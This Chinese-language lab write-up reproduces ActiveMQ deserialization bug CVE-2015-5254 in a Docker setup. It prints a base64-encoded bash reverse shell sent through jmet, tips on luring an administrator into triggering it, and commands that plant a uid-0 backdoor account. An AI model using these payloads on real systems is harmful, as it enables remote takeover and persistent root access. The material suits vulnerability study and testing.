# ActiveMQ反序列化漏洞 (CVE-2015-5254)

## 漏洞详情

Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。

远程攻击者可利用反序列化漏洞执行任意代码



## 影响版本

Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞



## 环境搭建

```
cd activemq/CVE-2015-5254
docker-compose up -d
```

环境运行后，将监听61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。访问`http://your-ip:8161`即可看到web管理页面，不过这个漏洞理论上是不需要web的。



## 漏洞复现

### 构造反弹shell

我们先构造一个bash来反弹shell，我们需要进行一次编码，防止命令传递时出错。

工具：http://www.jackson-t.ca/runtime-exec-payloads.html

```
bash -i >& /dev/tcp/本地监听IP/本地监听端口 0>&1
```

最后的命令构成

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2LjEyOS8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}
```

接着作为一个消息，将序列化对象发送给目标61616端口

### 利用jmet发送消息

这里我们使用[jmet](https://github.com/matthiaskaiser/jmet)进行漏洞利用。

> 我们需要在jar文件同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）

jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "需要执行的命令" -Yp ROME ip地址 61616
```

最后执行

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2LjEyOS8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}" -Yp ROME 192.168.16.128 61616
```

执行完后，它会给你的ID，待会要用到

![image-20210415181317161](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210415181317161.png)

接着我们打开本地监听，等待反弹的shell

```
nc lvvp 刚刚bash设置的端口
```

### 触发反弹shell

最后就是关键了，这个反弹shell需要单击消息进行命令触发执行，我们要登录管理页面来查看此队列中的所有消息

```
http://IP:8161/admin/browse.jsp?JMSDestination=event	# 账号密码都是admin
```

我们点击对应ID的消息，这时候我们就反弹到shell了，拿到了root权限

![image-20210415181424834](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210415181424834.png)

![image-20210415181535751](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210415181535751.png)

值得注意的是，通过Web管理页面访问消息并触发漏洞需要管理员特权。在没有密码的情况下，我们可以诱使管理员访问我们的链接以进行触发，或者伪装成其他服务的合法消息在触发时需要等待客户端访问。

### 添加用户

执行jmet的命令添加test用户并将其添加到root组，返回`192.168.221.185:8161/admin/browse.jsp?JMSDestination=event`页面，点击一下消息，触发它：

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "useradd -g root -s /bin/bash -u 10010 test" -Yp ROME 192.168.16.128 61616
```

让我们再将passwd中的test的uid修改为0，使它拥有root权限,返回`192.168.10.5:8161/admin/browse.jsp?JMSDestination=event`页面，点击一下消息，触发它。

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "sed -i "s/test:x:10010/test:x:0/g" /etc/passwd" -Yp ROME 192.168.16.128 61616
```

让我们再为test用户设置一个密码,返回`192.168.10.5:8161/admin/browse.jsp?JMSDestination=event`页面，点击一下消息，触发它。

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "echo "test:sd123456" | chpasswd" -Yp ROME 192.168.16.128 61616
```

到此为止，一个权限为root，密码为123456的用户即创建完毕。我们可以使用ssh直接远程登陆进入操作系统，并且还是最高权限。



## 漏洞分析

该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。



## 防御与修复

升级到最高版本